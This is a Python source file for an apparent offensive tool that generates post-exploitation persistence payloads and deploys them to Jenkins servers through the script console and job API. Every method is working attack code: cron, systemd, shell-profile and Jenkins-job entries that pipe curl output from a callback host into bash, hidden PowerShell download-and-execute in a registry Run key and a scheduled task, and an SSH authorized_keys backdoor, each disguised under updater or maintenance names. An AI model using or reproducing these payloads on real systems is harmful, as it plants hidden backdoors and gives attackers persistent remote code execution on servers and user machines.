#!/usr/bin/env python3
"""
Persistence Extension Packs - Post-Exploitation Persistence Mechanisms
Implements cron jobs, systemd services, Windows registry, and SSH key persistence
"""

import requests
import base64
import json
from typing import Dict, List, Optional
from rich.console import Console
from rich.table import Table
from rich.syntax import Syntax
import textwrap

console = Console()

class PersistenceManager:
    """Manage post-exploitation persistence mechanisms"""
    
    def __init__(self, jenkins_url: str, username: str = None, password: str = None):
        self.jenkins_url = jenkins_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        if username and password:
            self.session.auth = (username, password)
        
        self.persistence_methods = []
        self.deployed_mechanisms = []
    
    def generate_cron_persistence(self, callback_url: str, interval: str = "*/5 * * * *") -> Dict:
        """Generate Linux cron-based persistence"""
        console.print("[cyan][*] Generating cron persistence payload[/cyan]")
        
        cron_payload = f"{interval} curl -s {callback_url} | bash"
        
        groovy_script = textwrap.dedent(f'''
            def cronEntry = '{cron_payload}'
            def process = ['sh', '-c', "echo '$cronEntry' | crontab -"].execute()
            process.waitFor()
            println "Exit code: ${{process.exitValue()}}"
            println "Output: ${{process.text}}"
        ''')
        
        persistence = {
            "type": "cron",
            "platform": "linux",
            "interval": interval,
            "callback_url": callback_url,
            "payload": cron_payload,
            "deployment_script": groovy_script,
            "description": "Cron-based persistence executing callback every interval"
        }
        
        console.print("[green][PASS] Cron persistence payload generated[/green]")
        self._display_payload("Cron Persistence", groovy_script)
        
        return persistence
    
    def generate_systemd_service(self, callback_url: str, service_name: str = "jenkins-updater") -> Dict:
        """Generate systemd service persistence"""
        console.print("[cyan][*] Generating systemd service persistence[/cyan]")
        
        service_content = textwrap.dedent(f'''
            [Unit]
            Description=Jenkins Auto Updater
            After=network.target
            
            [Service]
            Type=simple
            ExecStart=/bin/bash -c "while true; do curl -s {callback_url} | bash; sleep 300; done"
            Restart=always
            RestartSec=60
            User=jenkins
            
            [Install]
            WantedBy=multi-user.target
        ''')
        
        groovy_script = textwrap.dedent(f'''
            def serviceContent = """
{service_content}
            """
            
            def servicePath = "/etc/systemd/system/{service_name}.service"
            new File(servicePath).text = serviceContent
            
            ['systemctl', 'daemon-reload'].execute().waitFor()
            ['systemctl', 'enable', '{service_name}'].execute().waitFor()
            ['systemctl', 'start', '{service_name}'].execute().waitFor()
            
            println "Systemd service {service_name} deployed"
        ''')
        
        persistence = {
            "type": "systemd",
            "platform": "linux",
            "service_name": service_name,
            "callback_url": callback_url,
            "service_content": service_content,
            "deployment_script": groovy_script,
            "description": "Systemd service executing callback in continuous loop"
        }
        
        console.print("[green][PASS] Systemd service persistence generated[/green]")
        self._display_payload("Systemd Service", service_content)
        
        return persistence
    
    def generate_windows_registry_persistence(self, callback_url: str, key_name: str = "JenkinsUpdater") -> Dict:
        """Generate Windows registry run key persistence"""
        console.print("[cyan][*] Generating Windows registry persistence[/cyan]")
        
        powershell_payload = f'powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'{callback_url}\')"'
        
        groovy_script = textwrap.dedent(f'''
            def regPath = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            def keyName = "{key_name}"
            def payload = '{powershell_payload}'
            
            def process = ['reg', 'add', regPath, '/v', keyName, '/t', 'REG_SZ', '/d', payload, '/f'].execute()
            process.waitFor()
            
            println "Registry key created: ${{process.exitValue() == 0 ? 'Success' : 'Failed'}}"
        ''')
        
        persistence = {
            "type": "windows_registry",
            "platform": "windows",
            "key_name": key_name,
            "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "callback_url": callback_url,
            "payload": powershell_payload,
            "deployment_script": groovy_script,
            "description": "Windows registry Run key for automatic execution on login"
        }
        
        console.print("[green][PASS] Windows registry persistence generated[/green]")
        self._display_payload("Windows Registry Persistence", groovy_script)
        
        return persistence
    
    def generate_ssh_key_persistence(self, public_key: str) -> Dict:
        """Generate SSH authorized_keys persistence"""
        console.print("[cyan][*] Generating SSH key persistence[/cyan]")
        
        groovy_script = textwrap.dedent(f'''
            def publicKey = '{public_key}'
            def homeDir = System.getProperty("user.home")
            def sshDir = new File("$homeDir/.ssh")
            
            if (!sshDir.exists()) {{
                sshDir.mkdirs()
                sshDir.setPermissions(0700)
            }}
            
            def authKeysFile = new File("$sshDir/authorized_keys")
            def currentKeys = authKeysFile.exists() ? authKeysFile.text : ""
            
            if (!currentKeys.contains(publicKey)) {{
                authKeysFile.append("\\n$publicKey\\n")
                authKeysFile.setPermissions(0600)
                println "SSH key added to authorized_keys"
            }} else {{
                println "SSH key already present"
            }}
        ''')
        
        persistence = {
            "type": "ssh_key",
            "platform": "linux",
            "public_key": public_key,
            "deployment_script": groovy_script,
            "description": "SSH public key added to authorized_keys for passwordless access"
        }
        
        console.print("[green][PASS] SSH key persistence generated[/green]")
        self._display_payload("SSH Key Persistence", groovy_script)
        
        return persistence
    
    def generate_startup_script_persistence(self, callback_url: str, script_name: str = ".jenkins_update.sh") -> Dict:
        """Generate shell profile persistence (.bashrc/.profile)"""
        console.print("[cyan][*] Generating shell profile persistence[/cyan]")
        
        payload_line = f'(curl -s {callback_url} | bash) &'
        
        groovy_script = textwrap.dedent(f'''
            def homeDir = System.getProperty("user.home")
            def profiles = [".bashrc", ".bash_profile", ".profile", ".zshrc"]
            
            def payloadLine = '{payload_line}'
            
            profiles.each {{ profile ->
                def profileFile = new File("$homeDir/$profile")
                if (profileFile.exists()) {{
                    def content = profileFile.text
                    if (!content.contains(payloadLine)) {{
                        profileFile.append("\\n$payloadLine\\n")
                        println "Added to $profile"
                    }}
                }}
            }}
        ''')
        
        persistence = {
            "type": "shell_profile",
            "platform": "linux",
            "callback_url": callback_url,
            "payload": payload_line,
            "deployment_script": groovy_script,
            "description": "Shell profile persistence executing callback on shell initialization"
        }
        
        console.print("[green][PASS] Shell profile persistence generated[/green]")
        self._display_payload("Shell Profile Persistence", groovy_script)
        
        return persistence
    
    def generate_scheduled_task_persistence(self, callback_url: str, task_name: str = "JenkinsUpdate") -> Dict:
        """Generate Windows scheduled task persistence"""
        console.print("[cyan][*] Generating Windows scheduled task persistence[/cyan]")
        
        powershell_command = f"powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{callback_url}')\""
        
        groovy_script = textwrap.dedent(f'''
            def taskName = "{task_name}"
            def command = '{powershell_command}'
            
            def createTask = """
schtasks /create /tn "$taskName" /tr "$command" /sc minute /mo 10 /f
            """.trim()
            
            def process = ['cmd', '/c', createTask].execute()
            process.waitFor()
            
            println "Scheduled task created: ${{process.exitValue() == 0 ? 'Success' : 'Failed'}}"
        ''')
        
        persistence = {
            "type": "scheduled_task",
            "platform": "windows",
            "task_name": task_name,
            "callback_url": callback_url,
            "command": powershell_command,
            "deployment_script": groovy_script,
            "description": "Windows scheduled task executing callback every 10 minutes"
        }
        
        console.print("[green][PASS] Windows scheduled task persistence generated[/green]")
        self._display_payload("Windows Scheduled Task", groovy_script)
        
        return persistence
    
    def generate_jenkins_job_persistence(self, callback_url: str, job_name: str = "maintenance-task") -> Dict:
        """Generate Jenkins job-based persistence"""
        console.print("[cyan][*] Generating Jenkins job persistence[/cyan]")
        
        job_xml = textwrap.dedent(f'''
            <?xml version='1.1' encoding='UTF-8'?>
            <project>
              <description>System maintenance task</description>
              <keepDependencies>false</keepDependencies>
              <properties/>
              <scm class="hudson.scm.NullSCM"/>
              <canRoam>true</canRoam>
              <disabled>false</disabled>
              <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
              <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
              <triggers>
                <hudson.triggers.TimerTrigger>
                  <spec>H/10 * * * *</spec>
                </hudson.triggers.TimerTrigger>
              </triggers>
              <concurrentBuild>false</concurrentBuild>
              <builders>
                <hudson.tasks.Shell>
                  <command>curl -s {callback_url} | bash</command>
                </hudson.tasks.Shell>
              </builders>
              <publishers/>
              <buildWrappers/>
            </project>
        ''')
        
        persistence = {
            "type": "jenkins_job",
            "platform": "jenkins",
            "job_name": job_name,
            "callback_url": callback_url,
            "job_xml": job_xml,
            "deployment_method": "create_job_via_api",
            "description": "Jenkins job executing callback every 10 minutes via cron trigger"
        }
        
        console.print("[green][PASS] Jenkins job persistence generated[/green]")
        self._display_payload("Jenkins Job Config", job_xml[:500])
        
        return persistence
    
    def deploy_via_script_console(self, groovy_script: str) -> bool:
        """Deploy persistence via Jenkins script console"""
        console.print("[cyan][*] Deploying via script console[/cyan]")
        
        try:
            crumb_resp = self.session.get(
                f"{self.jenkins_url}/crumbIssuer/api/json",
                timeout=10
            )
            
            headers = {}
            if crumb_resp.status_code == 200:
                crumb_data = crumb_resp.json()
                headers[crumb_data['crumbRequestField']] = crumb_data['crumb']
            
            resp = self.session.post(
                f"{self.jenkins_url}/scriptText",
                data={"script": groovy_script},
                headers=headers,
                timeout=30
            )
            
            if resp.status_code == 200:
                console.print("[green][PASS] Persistence mechanism deployed successfully[/green]")
                console.print(f"[cyan]Response: {resp.text[:200]}[/cyan]")
                return True
            else:
                console.print(f"[red][FAIL] Deployment failed with status {resp.status_code}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red][FAIL] Deployment error: {e}[/red]")
            return False
    
    def deploy_jenkins_job(self, job_name: str, job_xml: str) -> bool:
        """Deploy Jenkins job via API"""
        console.print(f"[cyan][*] Creating Jenkins job: {job_name}[/cyan]")
        
        try:
            crumb_resp = self.session.get(
                f"{self.jenkins_url}/crumbIssuer/api/json",
                timeout=10
            )
            
            headers = {'Content-Type': 'application/xml'}
            if crumb_resp.status_code == 200:
                crumb_data = crumb_resp.json()
                headers[crumb_data['crumbRequestField']] = crumb_data['crumb']
            
            resp = self.session.post(
                f"{self.jenkins_url}/createItem?name={job_name}",
                data=job_xml,
                headers=headers,
                timeout=30
            )
            
            if resp.status_code in [200, 201]:
                console.print(f"[green][PASS] Job {job_name} created successfully[/green]")
                return True
            else:
                console.print(f"[red][FAIL] Job creation failed with status {resp.status_code}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red][FAIL] Job creation error: {e}[/red]")
            return False
    
    def _display_payload(self, title: str, content: str):
        """Display payload with syntax highlighting"""
        syntax = Syntax(content[:500], "groovy", theme="monokai", line_numbers=False)
        console.print(f"\n[bold cyan]{title}:[/bold cyan]")
        console.print(syntax)
        console.print()
    
    def list_all_methods(self) -> List[str]:
        """List all available persistence methods"""
        methods = [
            "cron - Linux cron job persistence",
            "systemd - Linux systemd service persistence",
            "windows_registry - Windows registry Run key",
            "ssh_key - SSH authorized_keys persistence",
            "shell_profile - Shell profile (.bashrc, .zshrc)",
            "scheduled_task - Windows scheduled task",
            "jenkins_job - Jenkins job-based persistence"
        ]
        
        table = Table(title="Available Persistence Methods", show_header=True)
        table.add_column("Method", style="cyan")
        table.add_column("Description", style="green")
        table.add_column("Platform", style="yellow")
        
        platform_map = {
            "cron": "Linux",
            "systemd": "Linux",
            "windows_registry": "Windows",
            "ssh_key": "Linux/Unix",
            "shell_profile": "Linux/Unix",
            "scheduled_task": "Windows",
            "jenkins_job": "Jenkins"
        }
        
        for method in methods:
            method_type = method.split(' - ')[0]
            description = method.split(' - ')[1]
            platform = platform_map.get(method_type, "Unknown")
            table.add_row(method_type, description, platform)
        
        console.print(table)
        return methods
    
    def generate_all_payloads(self, callback_url: str, ssh_pubkey: str = None) -> List[Dict]:
        """Generate all persistence payloads at once"""
        console.print("[bold cyan]===== Generating All Persistence Payloads =====[/bold cyan]\n")
        
        payloads = []
        
        payloads.append(self.generate_cron_persistence(callback_url))
        payloads.append(self.generate_systemd_service(callback_url))
        payloads.append(self.generate_windows_registry_persistence(callback_url))
        payloads.append(self.generate_startup_script_persistence(callback_url))
        payloads.append(self.generate_scheduled_task_persistence(callback_url))
        payloads.append(self.generate_jenkins_job_persistence(callback_url))
        
        if ssh_pubkey:
            payloads.append(self.generate_ssh_key_persistence(ssh_pubkey))
        
        self.persistence_methods = payloads
        
        console.print(f"\n[green][PASS] Generated {len(payloads)} persistence payloads[/green]")
        return payloads
    
    def export_payloads(self, filename: str = "persistence_payloads.json"):
        """Export all payloads to JSON file"""
        output = {
            "jenkins_url": self.jenkins_url,
            "total_methods": len(self.persistence_methods),
            "payloads": self.persistence_methods
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        console.print(f"[green][PASS] Payloads exported to {filename}[/green]")
    
    def print_summary(self):
        """Print summary of persistence mechanisms"""
        table = Table(title="Persistence Summary", show_header=True, header_style="bold magenta")
        table.add_column("Type", style="cyan")
        table.add_column("Platform", style="yellow")
        table.add_column("Description", style="green")
        
        for payload in self.persistence_methods:
            table.add_row(
                payload["type"],
                payload["platform"],
                payload["description"][:60]
            )
        
        console.print(table)


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Persistence Extension Packs")
    parser.add_argument("--url", required=True, help="Jenkins URL")
    parser.add_argument("--username", help="Jenkins username")
    parser.add_argument("--password", help="Jenkins password")
    parser.add_argument("--callback", required=True, help="Callback URL for persistence")
    parser.add_argument("--ssh-key", help="SSH public key for key-based persistence")
    parser.add_argument("--deploy", action="store_true", help="Deploy persistence mechanisms")
    parser.add_argument("--output", default="persistence_payloads.json", help="Output file")
    parser.add_argument("--method", help="Specific persistence method to generate")
    
    args = parser.parse_args()
    
    pm = PersistenceManager(args.url, args.username, args.password)
    
    console.print("\n[bold cyan]===== Persistence Method Listing =====[/bold cyan]\n")
    pm.list_all_methods()
    
    if args.method:
        console.print(f"\n[bold cyan]===== Generating {args.method} Persistence =====[/bold cyan]\n")
        
        method_map = {
            "cron": pm.generate_cron_persistence,
            "systemd": pm.generate_systemd_service,
            "windows_registry": pm.generate_windows_registry_persistence,
            "ssh_key": lambda url: pm.generate_ssh_key_persistence(args.ssh_key),
            "shell_profile": pm.generate_startup_script_persistence,
            "scheduled_task": pm.generate_scheduled_task_persistence,
            "jenkins_job": pm.generate_jenkins_job_persistence,
        }
        
        if args.method in method_map:
            if args.method == "ssh_key" and not args.ssh_key:
                console.print("[red][FAIL] SSH key required for ssh_key method[/red]")
            else:
                payload = method_map[args.method](args.callback)
                
                if args.deploy:
                    if payload["type"] == "jenkins_job":
                        pm.deploy_jenkins_job(payload["job_name"], payload["job_xml"])
                    else:
                        pm.deploy_via_script_console(payload["deployment_script"])
        else:
            console.print(f"[red][FAIL] Unknown method: {args.method}[/red]")
    else:
        console.print("\n[bold cyan]===== Generating All Payloads =====[/bold cyan]\n")
        pm.generate_all_payloads(args.callback, args.ssh_key)
        
        console.print("\n[bold cyan]===== Summary =====[/bold cyan]\n")
        pm.print_summary()
        pm.export_payloads(args.output)
